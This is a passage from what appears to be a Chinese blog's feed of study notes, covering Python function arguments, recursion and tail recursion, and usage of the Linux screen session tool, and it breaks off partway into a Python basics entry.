class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, city=&#x27;Beijing&#x27;, addr=&#x27;Chaoyang&#x27;, zipcode=123456)</span><br></pre></td></tr></table></figure><p>如果要限制关键字参数的名字，就可以用命名关键字参数，例如，只接收<code>city</code>和<code>job</code>作为关键字参数。这种方式定义的函数如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, *, city, job):</span><br><span class="line">    print(name, age, city, job)</span><br></pre></td></tr></table></figure><p>和关键字参数<code>**kw</code>不同，命名关键字参数需要一个特殊分隔符<code>*</code>，<code>*</code>后面的参数被视为命名关键字参数。</p><p>调用方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person(&#x27;Jack&#x27;, 24, city=&#x27;Beijing&#x27;, job=&#x27;Engineer&#x27;)</span><br><span class="line"># Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure><p>如果函数定义中已经有了一个可变参数，后面跟着的命名关键字参数就不再需要一个特殊分隔符<code>*</code>了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, *args, city, job):</span><br><span class="line">    print(name, age, args, city, job)</span><br></pre></td></tr></table></figure><p>命名关键字参数必须传入参数名，这和位置参数不同。如果没有传入参数名，调用将报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, &#x27;Beijing&#x27;, &#x27;Engineer&#x27;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: person() takes 2 positional arguments but 4 were given</span><br></pre></td></tr></table></figure><p>由于调用时缺少参数名<code>city</code>和<code>job</code>，Python 解释器把这 4 个参数均视为位置参数，但<code>person()</code>函数仅接受 2 个位置参数。</p><p>命名关键字参数可以有缺省值，从而简化调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, *, city=&#x27;Beijing&#x27;, job):</span><br><span class="line">    print(name, age, city, job)</span><br></pre></td></tr></table></figure><p>由于命名关键字参数<code>city</code>具有默认值，调用时，可不传入<code>city</code>参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, job=&#x27;Engineer&#x27;)</span><br><span class="line">Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure><p>使用命名关键字参数时，要特别注意，如果没有可变参数，就必须加一个<code>*</code>作为特殊分隔符。如果缺少<code>*</code>，Python 解释器将无法识别位置参数和命名关键字参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, city, job):</span><br><span class="line">    # 缺少 *，city和job被视为位置参数</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h3 id="2-3-6-参数组合"><a href="#2-3-6-参数组合" class="headerlink" title="2.3.6 参数组合"></a>2.3.6 参数组合</h3><p>在 Python 中定义函数，可以用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这 5 种参数都可以组合使用。但是请注意，参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。</p><p>比如定义一个函数，包含上述若干种参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def f1(a, b, c=0, *args, **kw):</span><br><span class="line">    print(&#x27;a =&#x27;, a, &#x27;b =&#x27;, b, &#x27;c =&#x27;, c, &#x27;args =&#x27;, args, &#x27;kw =&#x27;, kw)</span><br><span class="line"></span><br><span class="line">def f2(a, b, c=0, *, d, **kw):</span><br><span class="line">    print(&#x27;a =&#x27;, a, &#x27;b =&#x27;, b, &#x27;c =&#x27;, c, &#x27;d =&#x27;, d, &#x27;kw =&#x27;, kw)</span><br></pre></td></tr></table></figure><p>在函数调用的时候，Python 解释器自动按照参数位置和参数名把对应的参数传进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f1(1, 2)</span><br><span class="line"># a = 1 b = 2 c = 0 args = () kw = &#123;&#125;</span><br><span class="line"></span><br><span class="line">f1(1, 2, c=3)</span><br><span class="line"># a = 1 b = 2 c = 3 args = () kw = &#123;&#125;</span><br><span class="line"></span><br><span class="line">f1(1, 2, 3, &#x27;a&#x27;, &#x27;b&#x27;)</span><br><span class="line"># a = 1 b = 2 c = 3 args = (&#x27;a&#x27;, &#x27;b&#x27;) kw = &#123;&#125;</span><br><span class="line"></span><br><span class="line">f1(1, 2, 3, &#x27;a&#x27;, &#x27;b&#x27;, x=99)</span><br><span class="line"># a = 1 b = 2 c = 3 args = (&#x27;a&#x27;, &#x27;b&#x27;) kw = &#123;&#x27;x&#x27;: 99&#125;</span><br><span class="line"></span><br><span class="line">f2(1, 2, d=99, ext=None)</span><br><span class="line"># a = 1 b = 2 c = 0 d = 99 kw = &#123;&#x27;ext&#x27;: None&#125;</span><br></pre></td></tr></table></figure><p>最神奇的是通过一个 tuple 和 dict，你也可以调用上述函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">args = (1, 2, 3, 4)</span><br><span class="line">kw = &#123;&#x27;d&#x27;: 99, &#x27;x&#x27;: &#x27;#&#x27;&#125;</span><br><span class="line">f1(*args, **kw)</span><br><span class="line"># a = 1 b = 2 c = 3 args = (4,) kw = &#123;&#x27;d&#x27;: 99, &#x27;x&#x27;: &#x27;#&#x27;&#125;</span><br><span class="line"></span><br><span class="line">args = (1, 2, 3)</span><br><span class="line">kw = &#123;&#x27;d&#x27;: 88, &#x27;x&#x27;: &#x27;#&#x27;&#125;</span><br><span class="line">f2(*args, **kw)</span><br><span class="line"># a = 1 b = 2 c = 3 d = 88 kw = &#123;&#x27;x&#x27;: &#x27;#&#x27;&#125;</span><br></pre></td></tr></table></figure><p>所以，对于任意函数，都可以通过类似<code>func(*args, **kw)</code>的形式调用它，无论它的参数是如何定义的。</p><blockquote><p>虽然可以组合多达 5 种参数，但不要同时使用太多的组合，否则函数接口的可理解性很差。</p><p>小结</p></blockquote><ul><li><p>Python 的函数具有非常灵活的参数形态，既可以实现简单的调用，又可以传入非常复杂的参数。</p></li><li><p>默认参数一定要用不可变对象，如果是可变对象，程序运行时会有逻辑错误！</p></li><li><p>要注意定义可变参数和关键字参数的语法：</p></li><li><p><code>*args</code>是可变参数，args 接收的是一个tuple；</p></li><li><p><code>**kw</code>是关键字参数，kw 接收的是一个dict。</p></li><li><p>以及调用函数时如何传入可变参数和关键字参数的语法：</p><ul><li>可变参数既可以直接传入：<code>func(1, 2, 3)</code>，又可以先组装 list 或 tuple，再通过<code>*args</code>传入：<code>func(*(1, 2, 3))</code>；</li><li>关键字参数既可以直接传入：<code>func(a=1, b=2)</code>，又可以先组装 dict，再通过<code>**kw</code>传入：<code>func(**&#123;&#39;a&#39;: 1, &#39;b&#39;: 2&#125;)</code>。</li><li>使用<code>*args</code>和<code>**kw</code>是 Python 的习惯写法，当然也可以用其他参数名，但最好使用习惯用法。</li></ul></li><li><p>命名的关键字参数是为了限制调用者可以传入的参数名，同时可以提供默认值。</p></li><li><p>定义命名的关键字参数在没有可变参数的情况下不要忘了写分隔符<code>*</code>，否则定义的将是位置参数。</p></li></ul><blockquote><p>✏️ 练习题：</p></blockquote><p>接收一个或多个数并计算乘积</p><p>以下函数允许计算两个数的乘积，请稍加改造，变成可接收一个或多个数并计算乘积：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def product(x, y):</span><br><span class="line">    return x * y</span><br></pre></td></tr></table></figure><h2 id="2-4-递归函数"><a href="#2-4-递归函数" class="headerlink" title="2.4 递归函数"></a>2.4 递归函数</h2><blockquote><p>在函数内部，可以调用其他函数。如果一个函数在内部调用自身本身，这个函数就是递归函数。</p></blockquote><p>举个例子，我们来计算阶乘<code>n! = 1 x 2 x 3 x ... x n</code>，用函数<code>fact(n)</code>表示，可以看出：</p><p>$fact(n)&#x3D;n!&#x3D;1×2×3×⋅⋅⋅×(n−1)×n&#x3D;(n−1)!×n&#x3D;fact(n−1)×n$</p><p>所以，<code>fact(n)</code>可以表示为<code>n x fact(n-1)</code>，只有 n &#x3D; 1 时需要特殊处理。</p><p>于是，<code>fact(n)</code>用递归的方式写出来就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def fact(n):</span><br><span class="line">    if n==1:</span><br><span class="line">        return 1</span><br><span class="line">    return n * fact(n - 1)</span><br></pre></td></tr></table></figure><p>如果我们计算<code>fact(5)</code>，可以根据函数定义看到计算过程如下：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703160052.png" alt="image-20200703160050927" title="image-20200703160050927"></p><p>!&gt; 递归函数的优点是定义简单，逻辑清晰。理论上，所有的递归函数都可以写成循环的方式，但循环的逻辑不如递归清晰。</p><p>使用递归函数需要注意防止栈溢出。在计算机中，函数调用是通过栈（stack）这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会减一层栈帧。由于栈的大小不是无限的，所以，递归调用的次数过多，会导致栈溢出。可以试试<code>fact(1000)</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; fact(1000)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 4, in fact</span><br><span class="line">  ...</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 4, in fact</span><br><span class="line">RuntimeError: maximum recursion depth exceeded in comparison</span><br></pre></td></tr></table></figure><p>解决递归调用栈溢出的方法是通过<strong>尾递归</strong>优化，事实上尾递归和循环的效果是一样的，所以，把循环看成是一种特殊的尾递归函数也是可以的。</p><p>? 尾递归是指，<strong>在函数返回的时候，调用自身本身，并且，return 语句不能包含表达式</strong>。这样，编译器或者解释器就可以把尾递归做优化，使递归本身无论调用多少次，都只占用一个栈帧，不会出现栈溢出的情况。</p><p>上面的<code>fact(n)</code>函数由于<code>return n * fact(n - 1)</code>引入了乘法表达式，所以就不是尾递归了。要改成尾递归方式，需要多一点代码，主要是要把每一步的乘积传入到递归函数中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def fact(n):</span><br><span class="line">    return fact_iter(n, 1)</span><br><span class="line"></span><br><span class="line">def fact_iter(num, product):</span><br><span class="line">    if num == 1:</span><br><span class="line">        return product</span><br><span class="line">    return fact_iter(num - 1, num * product)</span><br></pre></td></tr></table></figure><p>可以看到，<code>return fact_iter(num - 1, num * product)</code>仅返回递归函数本身，<code>num - 1</code>和<code>num * product</code>在函数调用前就会被计算，不影响函数调用。</p><p><code>fact(5)</code>对应的<code>fact_iter(5, 1)</code>的调用如下：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703160637.png" alt="image-20200703160635854" title="image-20200703160635854"></p><p>尾递归调用时，如果做了优化，栈不会增长，因此，无论多少次调用也不会导致栈溢出。</p><p>?? 遗憾的是，大多数编程语言没有针对尾递归做优化，Python 解释器也没有做优化，所以，即使把上面的<code>fact(n)</code>函数改成尾递归方式，也会导致栈溢出。</p><blockquote><p>? 小结</p></blockquote><ul><li>使用递归函数的优点是逻辑简单清晰，缺点是过深的调用会导致栈溢出。</li><li>针对尾递归优化的语言可以通过尾递归防止栈溢出。尾递归事实上和循环是等价的，没有循环语句的编程语言只能通过尾递归实现循环。</li><li>Python 标准的解释器没有针对尾递归做优化，任何递归函数都存在栈溢出的问题。</li></ul><blockquote><p>✏️ 练习题：</p></blockquote><p><a href="http://baike.baidu.com/view/191666.htm">汉诺塔</a>的移动可以用递归函数非常简单地实现。</p><p>请编写<code>move(n, a, b, c)</code>函数，它接收参数<code>n</code>，表示 3 个柱子 A、B、C 中第 1 个柱子 A 的盘子数量，然后打印出把所有盘子从 A 借助 B 移动到 C 的方法，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def move(n,a,b,c):</span><br><span class="line">    if n==1:</span><br><span class="line">        print(a,&#x27;--&gt;&#x27;,c)   #如果只有一个盘子，直接从a柱移动到c柱</span><br><span class="line">    else: </span><br><span class="line">        move(n-1,a,c,b)    #将a柱上的n-1个盘子通过c柱移动到b柱</span><br><span class="line">        print(a,&#x27;--&gt;&#x27;,c)   #移动完n-1个盘子之后，a柱剩下的最大盘子直接从a柱移到c柱</span><br><span class="line">        move(n-1,b,a,c)    #b柱上的n-1个盘子通过a柱移动到c柱</span><br><span class="line">move(3,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;)</span><br></pre></td></tr></table></figure><h2 id="2-5-参考资料"><a href="#2-5-参考资料" class="headerlink" title="2.5 参考资料"></a>2.5 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017105145133280">廖雪峰 - Python 3.x - 函数</a></li><li><a href="https://docs.python.org/3/library/functions.html">Python 官网内置函数</a></li><li><a href="https://veal98.github.io/CS-Wiki/#/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/Python/Python%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2-%E5%87%BD%E6%95%B0?id=?-%E5%87%BD%E6%95%B0">CS - WiKi</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> python </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>screen 的使用笔记</title>
      <link href="/93.html"/>
      <url>/93.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Screen是Linux下的一款远程会话管理工具，可以在多个进程之间多路复用一个物理终端的全屏窗口管理器。</p><p>它可以创建多个会话，每个会话中可以创建多个窗口，每个窗口中可以运行单独的任务，并且互相之间不受影响，还可以方便快速的在不同的窗口和会话之间切换。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>我这里使用的环境如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debian 10.2 64bit</span><br></pre></td></tr></table></figure><h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>首先使用以下命令查看是否已经安装了screen</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which screen </span><br></pre></td></tr></table></figure><p>如果存在screen，就会显示出screen 的路径：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207050826206.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220705080754185" title="image-20220705080754185"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>执行以下命令即可完成安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install screen</span><br></pre></td></tr></table></figure><h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#基本语法</span><br><span class="line">screen -S 名字</span><br><span class="line"> </span><br><span class="line">#举例，创建一个名为Test的Session</span><br><span class="line">screen -S Test </span><br></pre></td></tr></table></figure><h3 id="查看列表"><a href="#查看列表" class="headerlink" title="查看列表"></a>查看列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#基本语法</span><br><span class="line">screen -ls</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/pigo/202207050815628.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220705081459925" title="image-20220705081459925"></p><blockquote><p>解释说明：存在一个screen。其中一个的screen id为2570，screen的name为1，创建的时间是(07&#x2F;05&#x2F;2022 07:48:52 AM)。</p></blockquote><h3 id="进入screen"><a href="#进入screen" class="headerlink" title="进入screen"></a>进入screen</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#基本语法</span><br><span class="line">screen -r screen.name</span><br><span class="line"> </span><br><span class="line">#举例</span><br><span class="line">screen -r 2570.1</span><br><span class="line">或者</span><br><span class="line">screen -r 2570</span><br><span class="line">或者</span><br><span class="line">screen -r 1</span><br></pre></td></tr></table></figure><h3 id="退出screen"><a href="#退出screen" class="headerlink" title="退出screen"></a>退出screen</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#使用按键操作退出</span><br><span class="line">ALT + A +D</span><br><span class="line">#也可以使用这个命令退出当前窗口</span><br><span class="line">screen -d</span><br><span class="line">#如果要结束本窗口使用</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h3 id="删除screen"><a href="#删除screen" class="headerlink" title="删除screen"></a>删除screen</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#基本语法</span><br><span class="line">screen -S screen.name -X quit</span><br><span class="line"> </span><br><span class="line">#示例将name是1的screen 删除</span><br><span class="line"> </span><br><span class="line">screen -S 2570.1 -X quit</span><br></pre></td></tr></table></figure><h3 id="擦除全部的screen"><a href="#擦除全部的screen" class="headerlink" title="擦除全部的screen"></a>擦除全部的screen</h3><p>服务器重启之后，全部的screen均会挂掉，需要借助擦除命令，将所有挂掉的screen清除掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#基本语法</span><br><span class="line">screen -wipe</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://www.runoob.com/linux/linux-comm-screen.html">Linux screen命令</a></li><li><a href="https://www.linuxprobe.com/screen-example.html">screen 命令使用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> screen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(一)·基础</title>
      <link href="/91.html"/>
      <url>/91.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Python 非常适合初学者用来进入计算机编程领域。Python 属于非常高级的语言，掌握了这门高级语言，就对计算机编程的核心思想——抽象有了初步理解。如果希望继续深入学习计算机编程，可以学习 Java、C、JavaScript、Lisp 等不同类型的语言，只有多掌握不同领域的语言，有比较才更有收获。</p></blockquote><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611064140.png" alt="Python3" title="Python3"></p><h2 id="1-1-环境准备"><a href="#1-1-环境准备" class="headerlink" title="1.1 环境准备"></a>1.1 环境准备</h2><h3 id="1-1-1-Python-安装"><a href="#1-1-1-Python-安装" class="headerlink" title="1.1.1 Python 安装"></a>1.1.1 Python 安装</h3><p>（1）官网下载 Python</p><p>进入官网（<a href="https://www.python.org/">https://www.python.org</a>），点击 Downloads，选择要下载的版本：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200517223149.png" alt="image-20200517223148826" title="image-20200517223148826"></p><p>（2）安装 Python</p><p>安装时注意下图勾选部分一定要勾选：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200517223528.png" alt="image-20200517223527044" title="image-20200517223527044"></p><h3 id="1-1-2-安装代码编辑器-PyCharm"><a href="#1-1-2-安装代码编辑器-PyCharm" class="headerlink" title="1.1.2 安装代码编辑器 PyCharm"></a>1.1.2 安装代码编辑器 PyCharm</h3><p>（1）官网下载 PyCharm</p><p>进入官网（<a href="https://www.jetbrains.com/pycharm/">https://www.jetbrains.com/pycharm</a>），点击 Downloads，选择要下载的版本：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200517223349.png" alt="image-20200517223348661" title="image-20200517223348661"></p><p>（2）安装 PyCharm</p><p>设置安装路径之后，一直点 next 即可。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200517224624.png" alt="image-20200517224622654" title="image-20200517224622654"></p><h3 id="1-1-3-安装-Jupyter-notebook"><a href="#1-1-3-安装-Jupyter-notebook" class="headerlink" title="1.1.3 安装 Jupyter notebook"></a>1.1.3 安装 Jupyter notebook</h3><p>数据分析，对我来说最好用的还是 Jupyter notebook</p><ul><li><strong>Jupyter notebook</strong> ：基于 web 的交互式计算环境，可以编辑易于人们阅读的文档，用于展示数据分析的过程。</li></ul><blockquote><p>观察一段 10 行 Python 代码，感受一下 Python 的风格：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 温度转换</span><br><span class="line"># TempConvert.py</span><br><span class="line">TempStr = input(&quot;请输入带有符号的温度值：&quot;)</span><br><span class="line">if TempStr[-1] in [&#x27;F&#x27;,&#x27;f&#x27;]:</span><br><span class="line">  C = (eval(TempStr[0:-1]) - 32)/1.8</span><br><span class="line">  print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))</span><br><span class="line">elif TempStr[-1] in [&#x27;C&#x27;,&#x27;c&#x27;]:</span><br><span class="line">  F = 1.8*eval(TempStr[0:-1]) + 32</span><br><span class="line">  print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))</span><br><span class="line">else:</span><br><span class="line">  print(&quot;输入格式错误！&quot;)</span><br></pre></td></tr></table></figure><p>☎️ <code>eval()</code>去掉参数最外侧引号并执行余下语句的函数，称为“评估函数”。</p><blockquote><p>程序的基本编写方法：<code>IPO</code></p></blockquote><ul><li><code>I</code>：Input 输入，程序的输入</li><li><code>P</code>：Process 处理，程序的主要逻辑</li><li><code>O</code>：Output 输出，程序的输出</li></ul><p><strong>编程解决问题的步骤</strong>：</p><ul><li>（1）分析问题：分析问题的计算部分，想清楚</li><li>（2）划分边界：划分问题的功能边界，规划 IPO</li><li>（3）设计算法：设计问题的求解算法，关注算法</li><li>（4）编写程序：编写问题的计算程序，编程序</li><li>（5）调试测试：调试程序使正确运行，运行调试</li><li>（6）升级维护：适应问题的升级维护，更新完善</li></ul><h2 id="1-2-第一个-Python-程序"><a href="#1-2-第一个-Python-程序" class="headerlink" title="1.2 第一个 Python 程序"></a>1.2 第一个 Python 程序</h2><h3 id="1-2-1-HelloWorld"><a href="#1-2-1-HelloWorld" class="headerlink" title="1.2.1 HelloWorld"></a>1.2.1 HelloWorld</h3><p>创建第一个项目 HelloWorld –&gt; 创建文件 app.py –&gt; 写入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;HelloWorld&quot;)</span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200517225659.png" alt="image-20200517225658342" title="image-20200517225658342"></p><h3 id="1-2-2-输入和输出"><a href="#1-2-2-输入和输出" class="headerlink" title="1.2.2 输入和输出"></a>1.2.2 输入和输出</h3><h4 id="①-输出"><a href="#①-输出" class="headerlink" title="① 输出"></a>① 输出</h4><p>用 <code>print()</code> 在括号中加上字符串，就可以向屏幕上输出指定的文字。比如输出 <code>hello, world</code>，用代码实现如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;hello, world&#x27;)</span><br></pre></td></tr></table></figure><p><code>print()</code> 函数也可以接受多个字符串，用逗号 “,” 隔开，就可以连成一串输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;The quick brown fox&#x27;, &#x27;jumps over&#x27;, &#x27;the lazy dog&#x27;)</span><br></pre></td></tr></table></figure><p><code>print()</code> 会依次打印每个字符串，遇到逗号 “,” 会输出一个空格，因此，输出的字符串是这样拼起来的：</p><p>?&gt; The quick brown fox jumps over the lazy dog</p><p><code>print()</code> 也可以打印整数，或者计算结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(300)</span><br><span class="line">print(&#x27;100 + 200 = &#x27;,100 + 200) # 输出 100 + 200 = 300</span><br></pre></td></tr></table></figure><p>!&gt; 注意，对于 <code>100 + 200</code>，Python 解释器自动计算出结果 <code>300</code>，但是，<code>&#39;100 + 200 =&#39;</code> 是字符串而非数学公式，Python 把它视为字符串</p><h4 id="②-输入"><a href="#②-输入" class="headerlink" title="② 输入"></a>② 输入</h4><p>Python 提供了一个 <code>input()</code>，可以让用户输入字符串，并存放到一个变量里。比如输入用户的名字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;Input your name: &#x27;)</span><br><span class="line">name = input()</span><br><span class="line">print(&#x27;Hello! &#x27;,name)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200610194542.png" alt="image-20200610194537419" title="image-20200610194537419"></p><p>我们也可以直接在 input 中显示一个字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = input(&#x27;Input your name: &#x27;)</span><br><span class="line">print(&#x27;Hello! &#x27;,name)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200610194824.png" alt="image-20200610194823007" title="image-20200610194823007"></p><h3 id="1-2-3-小结"><a href="#1-2-3-小结" class="headerlink" title="1.2.3 小结"></a>1.2.3 小结</h3><p>任何计算机程序都是为了执行一个特定的任务，有了输入，用户才能告诉计算机程序所需的信息，有了输出，程序运行后才能告诉用户任务的结果。</p><p>输入是 Input，输出是 Output，因此，我们把输入输出统称为 Input &#x2F; Output，或者简写为 IO。</p><p><code>input()</code> 和 <code>print()</code> 是在命令行下面最基本的输入和输出，但是，用户也可以通过其他更高级的图形界面完成输入和输出，比如，在网页上的一个文本框输入自己的名字，点击 “确定” 后在网页上看到输出信息。</p><h3 id="1-2-4-实例-1：温度转换"><a href="#1-2-4-实例-1：温度转换" class="headerlink" title="1.2.4 实例 1：温度转换"></a>1.2.4 实例 1：温度转换</h3><p><strong>设计算法</strong>：根据华氏和摄氏温度定义，利用转换公式如下：</p><p>$$ C &#x3D; (F - 32)&#x2F;1.8 $$</p><p>$$ F &#x3D; C*1.8 + 32 $$</p><p>其中，C 表示摄氏温度，F 表示华氏温度。</p><p>在前面，我给过温度转换的代码，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 